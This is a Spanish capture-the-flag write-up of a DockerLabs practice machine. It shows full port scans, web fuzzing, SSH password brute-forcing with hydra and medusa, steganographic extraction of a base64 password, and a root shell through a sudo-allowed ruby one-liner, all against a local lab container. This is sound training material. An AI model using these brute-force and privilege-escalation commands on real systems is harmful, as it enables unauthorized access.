
> Habilidades: Enumeración, fuerza bruta, escalada de privilegios (linux), esteganografía.
> 
![intro](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/intro.png?raw=true)

# RECONOCIMIENTO

## Nmap Scan

Realizamos el primer sondeo a todos los puertos para verificar que puertos y servicios están activos.
~~~ bash
nmap --open -p- -n -sS -Pn $ip -oG FirsScan
~~~

![Primer_Escaneo](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/Nmap1Scan.png?raw=true)

- `--open`: Mostrar los puertos abiertos.
- `-p-`: Escanear todo el rango de puertos (65535)
- `-sS`: Escaneo TCP SYN, técnica más sigilosa para determinar el estado del puerto.
- `-n`: No aplicar resolución DNS.
- `-Pn`: Deshabilitar el descubrimiento de host, asumiendo que el objetivo se encuentra activo.
- `-oG`: Exportar el escaneo a un formato `Grepable`, util para extraer información.

_____________________________________________________________________________________________________________________________________________________________________

### Enumerar Servicios

Realizamos enumeración a los puertos abiertos lanzando los scripts predeterminados e indicando la versión de los servicios. (-sC -sV)
~~~ bash
nmap -sVC -p 22,80 172.17.0.2 -oN ServicesScan
~~~

![Escaneo_Sevicios](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/ServicesScan.png?raw=true)

- `-sC`: Ejecuta scripts NSE (Nmap Scripting Engine) predeterminados.
- `-sV`: Detecta la versión del servicio que se está ejecutando en cada puerto abierto.
_____________________________________________________________________________________________________________________________________________________________________

## Http Service


Vemos que el puerto `80` corresponde a un servicio HTTP. Vamos a investigar qué hay en él. Podemos usar la herramienta `whatweb` para listar las tecnologías detectadas en el servidor. (Como alternativa, puedes usar la extensión de navegador `Wappalyzer`).

~~~ bash
whatweb http://172.17.0.2
~~~

![whatweb](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/whatweb.png?raw=true)

Abrimos en navegador y vamos a dicha web. Leemos y podemos ver algo interesante: una nota de `Carlota`.
Siempre reviso el código fuente de la web `view-source` por si se me escapa algo interesante.

![despido](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/despidoempleado.png?raw=true)

_____________________________________________________________________________________________________________________________________________________________________

## Fuzzing

El siguiente paso será intentar descubrir posibles directorios. Podemos usar cualquier herramienta de fuzzing; yo usaré `wfuzz` y `gobuster`

### Wfuzz
~~~ bash
wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 http://172.17.0.2/FUZZ
~~~

![wfuzz](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/zfuzz.png?raw=true)

- `-c`: Formato colorizado
- `--hc=404`: Ocultar el código de estado 404 (Not Found)
- `-w`: Especificar un diccionario de palabras
- `-t 200`: Dividir el proceso en 200 hilos, agilizando la tarea


### Gobuster

~~~ bash
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
~~~

![gobuster](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/burp.png?raw=true)

- `dir`: Modo de descubrimiento de directorios y archivos
- `-u`: Dirección URL
- `-w`: Diccionario a usar
- `-t 200`: Establecer 200 subprocesos 

En ambos casos, no se ha descubierto ningun directorio. :(
_____________________________________________________________________________________________________________________________________________________________________

## Fuerza Bruta

Como obtuvimos dos nombres anteriormente, vamos a intentar hacer fuerza bruta con uno de ellos. En este caso, usaremos dos herramientas diferentes aunque con el mismo resultado.

~~~ bash
hydra -l carlota -P /usr/share/wordlists/rockyou.txt -t4 ssh://172.17.0.2
~~~

![hydra](https://i.imgur.com/gHUFhTq.png)


- `-l`: Especifica un nombre.
- `-P`: Especifica una lista de palabras.
- `-t4`: Especifica hilos a usar. (más rapido)
- `ssh`: Especifica el protocolo.

~~~ bash
medusa -h 172.17.0.2 -u carlota -P /usr/share/wordlists/rockyou.txt -M ssh -t 4
~~~
![medusa](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/medusa.png?raw=true)

- `-h`: Especifica la dirección IP del objetivo.
- `-u`: Especifica el nombre de usuario a probar.
- `-P`: Especifica el archivo de lista de contraseñas a utilizar.
- `-M`: Especifica el módulo a utilizar, en este caso SSH.
- `-t 4`: Especifica el número de hilos a utilizar para agilizar el proceso.

__¡¡BINGO!! obtuvimos las credenciales de Carlota.__

_____________________________________________________________________________________________________________________________________________________________________
# Escalada de privilegios

Una vez tenemos acceso, tratamos la TTY para poder usarla comodamente. Para ello cambiaremos el valor de la variable `$TERM`. En este caso, nuestra shell (SSH) ya es interactiva, solo necesitaremos:

~~~ bash
/bin/bash -i
export TERM=xterm
~~~

### Enumeración del Entorno

En primer lugar, veremos si tenemos privilegios sudo mediante `sudo -l`, pero no hay suerte. Seguimos enumerando y vemos una imagen en una carpeta de Carlota.
Vamos a comprobar si tiene información oculta. En primer lugar, nos la descargamos. Lo haremos de `dos modos diferentes`, es bueno saber varias maneras de hacer las cosas ya que no siempre funcionan los mismos métodos.

![estego](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/estego.png?raw=true)

Método 1: SCP
~~~ bash
scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg /opt/amor
~~~
![scp](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/scp.png?raw=true)

Método 2: Servidor temporal con Python

Víctima:
~~~ bash
python3 -m http.server 8080
~~~
![httpserver](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/httpserver.png?raw=true)

Atacante:
~~~
wget http://172.17.0.2:8080/imagen.jpg
~~~
![wget](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/wget.png?raw=true)


## Esteganografía y escalada de privilegios
Para comprobar si tiene información oculta o metadatos, usaremos la herramienta `steghide`. Con las opciones `extract` y `sf`, extraemos los metadatos si los hubiera en un archivo.

~~~
steghide extract -sf imagen.jpg
~~~
El contenido del archivo parece estar codificado en base64.

![steg](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/stg.png?raw=true)

Decodificamos con un simple comando.

~~~
cat secret.txt | base64 -d
~~~

![decode](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/decode.png?raw=true)

Probamos la contraseña para escalar a root, pero no hay suerte. Revisamos el archivo `/etc/passwd` para ver los usuarios. Observamos tres usuarios activos: oscar, carlota y root.

~~~
cat /etc/passwd
~~~
![users](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/users.png?raw=true)

Probamos con el usuario Oscar y efectivamente funciona.
~~~
su oscar
whoami
~~~
![changeuser](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/oscar.png?raw=true)

Los siguientes pasos consisten en enumerar al igual que con el usuario Carlota. Tanto directorios, como permisos de archivos y rutas. El primer paso es saber si puede ejecutar sudo con:
~~~
sudo -l
~~~
![nopassword](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/nopasswd.png?raw=true)

Podemos ver que el usuario Oscar puede ejecutar ``/usr/bin/ruby`` como root sin necesidad de contraseña. Ahora vamos a averiguar la manera. Vamos a la web ``GTFOBins``, buscamos ruby y seleccionamos sudo. Leemos atentamente, en este caso buscamos una shell simplemente.

![ruby](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/ruby.png?raw=true)
~~~
sudo ruby -e 'exec "/bin/sh"'
whoami
~~~

![root](https://github.com/wilasky/willy.github.io/blob/master/writeups-dockerlabs/machines/Easy/images/root.png?raw=true)

Pues ya estaría :D



